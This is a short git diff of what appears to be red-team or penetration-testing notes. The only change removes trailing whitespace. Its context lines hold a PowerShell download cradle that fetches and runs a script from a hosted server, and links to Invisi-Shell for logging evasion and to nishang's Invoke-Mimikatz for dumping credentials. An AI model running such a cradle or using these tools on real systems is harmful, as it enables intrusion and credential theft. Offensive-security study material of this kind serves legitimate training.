@@ -65,7 +65,7 @@ iex ((New-Object Net.WebClient).DownloadString('http://hosted-server-ip-where-th
 
 ## GitHub Resources
 1. For InvisiShellProfiler.dll - https://github.com/OmerYa/Invisi-Shell/blob/master/build/x64/Release/InvisiShellProfiler.dll
-2. For Kiwi - https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1 
+2. For Kiwi - https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
 
 
 
